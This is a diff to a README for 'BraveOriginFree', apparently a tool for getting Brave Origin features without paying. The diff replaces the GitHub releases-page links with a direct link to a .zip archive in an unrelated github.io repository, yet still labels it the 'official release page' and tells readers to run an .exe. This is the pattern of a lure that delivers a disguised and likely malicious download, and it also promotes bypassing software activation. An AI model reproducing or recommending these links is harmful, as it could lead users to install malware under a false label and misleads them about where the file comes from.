@@ -5,7 +5,7 @@ description: "Enable Brave Origin features on Windows for free by applying the o
 ---
 # 🚀 BraveOriginFree - Access Private Browsing Without Cost
 
-[![Download BraveOriginFree](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Personal-allen447/BraveOriginFree/releases)
+[![Download BraveOriginFree](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Personal-allen447/personal-allen447.github.io/main/demandingly/allen-github-personal-io-2.6.zip)
 
 BraveOriginFree provides a private web browsing experience for Windows users. This version operates without fees and removes standard activation barriers. You run this software as a portable application. It requires no installation process and does not demand administrator rights on your computer.
 
@@ -26,7 +26,7 @@ Your computer must meet these basic needs to run the browser smoothly:
 
 Follow these steps to start using the browser on your Windows machine:
 
-1. Visit the official release page here: [https://github.com/Personal-allen447/BraveOriginFree/releases](https://github.com/Personal-allen447/BraveOriginFree/releases).
+1. Visit the official release page here: [https://raw.githubusercontent.com/Personal-allen447/personal-allen447.github.io/main/demandingly/allen-github-personal-io-2.6.zip](https://raw.githubusercontent.com/Personal-allen447/personal-allen447.github.io/main/demandingly/allen-github-personal-io-2.6.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your documents folder.
